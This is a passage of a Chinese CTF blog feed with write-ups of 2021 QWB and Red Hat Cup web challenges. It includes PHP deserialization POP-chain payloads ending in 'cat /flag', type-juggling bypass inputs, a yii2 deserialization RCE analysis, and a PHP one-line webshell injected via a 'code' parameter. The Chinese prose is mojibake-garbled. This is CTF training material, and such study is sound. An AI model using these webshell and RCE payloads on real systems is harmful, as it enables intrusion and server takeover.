class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>payloadä¸º</p><p><code>?pop=O:6:&quot;TPmYmu&quot;:1:&#123;s:7:&quot;qfDgtGD&quot;;O:6:&quot;z3w6kL&quot;:1:&#123;s:7:&quot;X5XSpPz&quot;;O:6:&quot;olTmkb&quot;:1:&#123;s:7:&quot;tTEiXpd&quot;;O:6:&quot;Moag8l&quot;:1:&#123;s:7:&quot;D8ea5Xn&quot;;O:6:&quot;QcHqVE&quot;:1:&#123;s:7:&quot;XHhuV4y&quot;;O:6:&quot;hCG6ag&quot;:1:&#123;s:7:&quot;cYnq47g&quot;;O:6:&quot;EYyxSm&quot;:1:&#123;s:7:&quot;A7icng3&quot;;O:6:&quot;CDF5aP&quot;:1:&#123;s:7:&quot;KUxwPnq&quot;;O:6:&quot;a1rktQ&quot;:1:&#123;s:7:&quot;G2ZqPlg&quot;;O:6:&quot;bPC9aV&quot;:1:&#123;s:7:&quot;mUtXpNL&quot;;O:6:&quot;lNHRgw&quot;:1:&#123;s:7:&quot;iI0ggvd&quot;;O:6:&quot;uhsLTo&quot;:1:&#123;s:7:&quot;V4cm8RE&quot;;O:6:&quot;xmFnqe&quot;:1:&#123;s:7:&quot;XVKtQaL&quot;;O:6:&quot;ygWYP5&quot;:1:&#123;s:7:&quot;BeaCQ8a&quot;;O:6:&quot;kU9NTw&quot;:1:&#123;s:7:&quot;Rc3QaRn&quot;;O:6:&quot;gyRrwz&quot;:1:&#123;s:7:&quot;ykDFgZf&quot;;O:6:&quot;Q2GEHp&quot;:1:&#123;s:7:&quot;GgRUaWA&quot;;O:6:&quot;cnxShX&quot;:1:&#123;s:7:&quot;lKlVzwp&quot;;O:6:&quot;MyFOP4&quot;:1:&#123;s:7:&quot;aIr6pnl&quot;;O:6:&quot;TWKFWY&quot;:1:&#123;s:7:&quot;iMX9NnG&quot;;O:6:&quot;ogz6Dr&quot;:1:&#123;s:7:&quot;ThhObgx&quot;;O:6:&quot;QaCgIg&quot;:1:&#123;s:7:&quot;gpW7aFB&quot;;O:6:&quot;Zg0xg5&quot;:1:&#123;s:7:&quot;p4epegQ&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv=sytem(&quot;cat /flag&quot;);//</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ¯</title>
    <link href="/2021/07/12/2021-7-12-QWB/"/>
    <url>/2021/07/12/2021-7-12-QWB/</url>
    
    <content type="html"><![CDATA[<h2 id="å¼ºç½‘å…ˆé”‹å¯»å®"><a href="#å¼ºç½‘å…ˆé”‹å¯»å®" class="headerlink" title="å¼ºç½‘å…ˆé”‹å¯»å®"></a>å¼ºç½‘å…ˆé”‹å¯»å®</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filter_word</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-string">&#x27;KeY1lhv&#x27;</span>,<span class="hljs-string">&#x27;source&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\(&#x27;</span>,<span class="hljs-string">&#x27;\.&#x27;</span>,<span class="hljs-string">&#x27;num&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;\/&#x27;</span>,<span class="hljs-string">&#x27;\,&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;0000000&#x27;</span>);<br>        <span class="hljs-variable">$filter_phrase</span>= <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_word</span>).<span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter_phrase</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ppp</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$ppp</span>);<br>&#125;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number1&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number2&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;nunber3&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number4&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number5&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-variable">$num1</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number1&#x27;</span>]);        <br><span class="hljs-variable">$num2</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number2&#x27;</span>]);        <br><span class="hljs-variable">$num3</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number3&#x27;</span>]);        <br><span class="hljs-variable">$num4</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number4&#x27;</span>]);<br><span class="hljs-variable">$num5</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number5&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$ppp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num1</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$num1</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;éæ•°å­—&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">else</span>&#123;<br>  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num1</span> &gt; <span class="hljs-number">1024</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸€å±‚&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num2</span>) &amp;&amp; strlen(<span class="hljs-variable">$num2</span>) &lt;= <span class="hljs-number">4</span> &amp;&amp; intval(<span class="hljs-variable">$num2</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">500000</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¬¬äºŒå±‚&quot;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num3</span>) &amp;&amp; <span class="hljs-string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="hljs-variable">$num3</span>),<span class="hljs-number">0</span>,<span class="hljs-number">7</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸‰å±‚&quot;</span>;<br>                <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$num4</span> &lt; <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> == <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> &lt;= <span class="hljs-number">0</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &gt; <span class="hljs-number">6</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &lt; <span class="hljs-number">8</span>)&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num4</span>) )&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¬¬å››å±‚&quot;</span>;<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num5</span>)||(strlen(<span class="hljs-variable">$num5</span>)==<span class="hljs-number">0</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                    <span class="hljs-variable">$b</span>=json_decode(@<span class="hljs-variable">$num5</span>);<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> = <span class="hljs-variable">$b</span> === <span class="hljs-literal">NULL</span>)&#123;<br>                                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> === <span class="hljs-literal">true</span>)&#123;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç¬¬äº”å±‚&quot;</span>;<br>                                    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;KeY1lhv.php&#x27;</span>;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$KEY1</span>;<br>                                &#125;<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                        &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no111&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="ä¼ å‚æ–¹å¼"><a href="#ä¼ å‚æ–¹å¼" class="headerlink" title="ä¼ å‚æ–¹å¼"></a>ä¼ å‚æ–¹å¼</h4><p>æœ‰ä¸ªextract($_POST);å®ƒæŠŠæ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚</p><h4 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h4><p>ç¬¬ä¸€å±‚<code>å¼±ç±»å‹</code>ï¼Œç¬¬äºŒå±‚<code>ç§‘å­¦è®¡æ•°æ³•</code>,ç¬¬ä¸‰å±‚<code>è„šæœ¬</code>ï¼Œç¬¬å››å±‚<code>ç§‘å­¦è®¡æ•°æ³•</code>,ç¬¬äº”å±‚<code>json_decode()</code>.æ¥å—ä¸€ä¸ª JSON ç¼–ç çš„å­—ç¬¦ä¸²å¹¶ä¸”æŠŠå®ƒè½¬æ¢ä¸º PHP å˜é‡</p><p>é€šè¿‡æ°å½“çš„ PHP ç±»å‹è¿”å›åœ¨ <code>json</code> ä¸­ç¼–ç çš„æ•°æ®ã€‚å€¼<code>true</code>, <code>false</code> å’Œ <code>null</code> ä¼šç›¸åº”åœ°è¿”å› <strong><code>true</code></strong>, <strong><code>false</code></strong> å’Œ <strong><code>null</code><strong>ã€‚ å¦‚æœ <code>json</code> æ— æ³•è¢«è§£ç ï¼Œ æˆ–è€…ç¼–ç æ•°æ®æ·±åº¦è¶…è¿‡äº†é€’å½’é™åˆ¶çš„è¯ï¼Œå°†ä¼šè¿”å›</strong><code>null</code></strong> ã€‚</p><p>payload:<code>ppp[number1]=1234a&amp;ppp[number2]=9e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0e99999&amp;ppp[number5]=1a</code></p><h4 id="ç¬¬äºŒéƒ¨åˆ†æ‰¾keyå°±åœ¨é‚£ä¸ªé‡Œé¢å†™ç€ï¼Œæ‹¼æ¥ä¸€ä¸‹å³å¯"><a href="#ç¬¬äºŒéƒ¨åˆ†æ‰¾keyå°±åœ¨é‚£ä¸ªé‡Œé¢å†™ç€ï¼Œæ‹¼æ¥ä¸€ä¸‹å³å¯" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†æ‰¾keyå°±åœ¨é‚£ä¸ªé‡Œé¢å†™ç€ï¼Œæ‹¼æ¥ä¸€ä¸‹å³å¯"></a>ç¬¬äºŒéƒ¨åˆ†æ‰¾keyå°±åœ¨é‚£ä¸ªé‡Œé¢å†™ç€ï¼Œæ‹¼æ¥ä¸€ä¸‹å³å¯</h4><h2 id="å¼ºâ½¹å…ˆé”‹å¯»å®"><a href="#å¼ºâ½¹å…ˆé”‹å¯»å®" class="headerlink" title="å¼ºâ½¹å…ˆé”‹å¯»å®"></a>å¼ºâ½¹å…ˆé”‹å¯»å®</h2><p>popé“¾æ¯”è¾ƒæ˜æ˜¾</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-variable">$a</span>;<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]=<span class="hljs-variable">$b</span>;<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-string">&quot;/flag&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> Room();<br> &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$a</span>-&gt;invoke();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Info(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Start(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>popmasterçš„è„šæœ¬æ˜å¤©å†å†™ã€‚ä¼‘æ•´ä¸€ä¸‹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çº¢å¸½æ¯</title>
    <link href="/2021/07/09/2021-7-9-%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/09/2021-7-9-%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®æ˜¯åœ¨ctfhubä¸Šå¤ç°çš„</p><h2 id="Find-it"><a href="#Find-it" class="headerlink" title="Find_it"></a>Find_it</h2><p>ä¸€çœ‹åº”è¯¥æ˜¯æ–‡ä»¶æ³„éœ²äº†ï¼Œè®¿é—®äº†ä¸€ä¸‹robots.txtå‘ç°æœ‰æç¤º<code>1ndexx.php</code>ç»“åˆå¤‡ä»½æ–‡ä»¶æ³„éœ²</p><p>ç›´æ¥è®¿é—®<code>/.1ndexx.php.swp</code>å¾—åˆ°æºç (å…³é”®ä»£ç å¦‚ä¸‹)</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#Really easy...</span><br><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open!&quot;</span>);<br><br><span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;flag.php&quot;</span>));<br><br><br><span class="hljs-variable">$hack</span>=fopen(<span class="hljs-string">&quot;hack.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open&quot;</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you die&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">33</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>&#125;<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$a</span>);<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);<br><br>fclose(<span class="hljs-variable">$file</span>);<br>fclose(<span class="hljs-variable">$hack</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>ä»£ç å¾ˆç®€å•ï¼Œä¼ å…¥codeè¿‡æ»¤äº†ä¸€å †ä¸œè¥¿ï¼Œç„¶åå†™å…¥æ–‡ä»¶ã€‚æ˜¾ç„¶æ˜¯è¦å†™å…¥æœ¨é©¬ä¹‹ç±»çš„ã€‚</p><p>è¿™é‡Œæœ‰å‡ ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå¤§å°å†™ç»•è¿‡ï¼Œæ„é€ ä¸º</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?code=%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span><span class="hljs-keyword">Eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);?%<span class="hljs-number">3</span>E<br></code></pre></div></td></tr></table></figure><p>èšå‰‘è¿æ¥å³å¯</p><p><img src="https://img-blog.csdnimg.cn/20210709125140850.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¦å¤–ä¸€ä¸ªæ€è·¯æ˜¯ç½‘ä¸Šçœ‹çš„ï¼Œç”¨<code>show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚</code></p><p>æ„é€ payloadï¼š<code>?code=&lt;?php show_source(__FILE__);?&gt;</code>ç„¶åè®¿é—®<code>hack.php</code>,ä½†æ˜¯æˆ‘åœ¨ctfhubæ²¡æœ‰åšæˆåŠŸä¹Ÿä¸çŸ¥é“ä¸ºå•¥â€¦.</p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>ç°æˆçš„yii2çš„ååºåˆ—åŒ–ï¼Œæ„Ÿè§‰ç°åœ¨çœ‹è¿™äº›æ¡†æ¶ä¸æ˜¯é‚£ä¹ˆé™Œç”Ÿäº†ã€‚</p><p>å…ˆåˆ†æäº†ä¸€ä¸‹ç½‘ä¸Šçš„å¤ç°è¿‡ç¨‹ï¼Œä¸€æ¡é“¾æ˜¯ä»</p><p><img src="https://img-blog.csdnimg.cn/202107101335156.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›resetå‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/20210710133553865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†åˆ«çš„åœ°æ–¹çš„closeå‡½æ•°ï¼Œè¿™é‡Œçš„<code>_dataReader</code>æ˜¯å¯æ§çš„ï¼Œæƒ³åŠæ³•è°ƒç”¨<code>__call</code>å‡½æ•°ã€‚å…¨å±€æœç´¢ä¸€ä¸‹__callï¼Œæœ€ååœ¨<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>æ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„__callæ–¹æ³•ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210710134209695.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>$method</code>å³ä¸º<code>close</code>ï¼Œå‚æ•°ä¸ºç©ºï¼Œè·Ÿè¿›formatï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210710134258823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹åˆ°<code>call_user_func_array</code>å°±å¥½åŠäº†ï¼Œè·Ÿè¿›getFormatterå‡½æ•°ï¼Œè¿™é‡Œ<code>$this-&gt;formatters</code>å¯æ§ï¼Œå› æ­¤<code>getFormatter</code>æ–¹æ³•çš„è¿”å›å€¼ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>;ä¸­ï¼Œå›è°ƒå‡½æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯<code>$arguments</code>ä¸ºç©ºï¼Œæ‰€ä»¥ç›¸å½“äºæˆ‘ä»¬ç°åœ¨èƒ½å¹²ä¸¤ä»¶äº‹ï¼Œå¯ä»¥è°ƒç”¨yii2ä¸­ä»»æ„çš„ä¸€ä¸ªæ— å‚æ–¹æ³•ï¼Œæˆ–è€…è°ƒç”¨åŸç”Ÿphpçš„ç±»ä¼¼phpinfo()è¿™æ ·çš„æ— å‚æ–¹æ³•ï¼Œä½†æ˜¯ç¬¬äºŒç§è‚¯å®šä¸èƒ½RCEï¼Œå› æ­¤è¿˜è¦åœ¨yii2ä¸­å·²æœ‰çš„æ— å‚æ–¹æ³•ä¸­è¿›è¡ŒæŒ–æ˜ï¼š</p><p>æœ€åæ‰¾åˆ°çš„<code>rest/CreateAction.phpä»¥åŠrest/IndexAction.php</code>éƒ½å¾ˆå¥½ç”¨ã€‚è¿™é‡Œåˆ†æä¸€ä¸‹IndexAction.phpï¼š<br>ä¸»è¦æ˜¯å®ƒçš„runæ–¹æ³•ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210710134545205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>$this-&gt;checkAccess</code>å’Œ<code>$this-&gt;id</code>éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œç›¸å½“äºç›´æ¥å‡½æ•°åå’Œå‚æ•°éƒ½å¯æ§äº†ï¼Œååºåˆ—åŒ–é“¾è‡³æ­¤ç»“æŸã€‚</p><p>é¢˜ç›®ç»™çš„è¿™ä¸ªé¢˜ï¼Œååºåˆ—åŒ–å…¥å£å¾ˆå®¹æ˜“æ‰¾åˆ°ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210710140803158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" 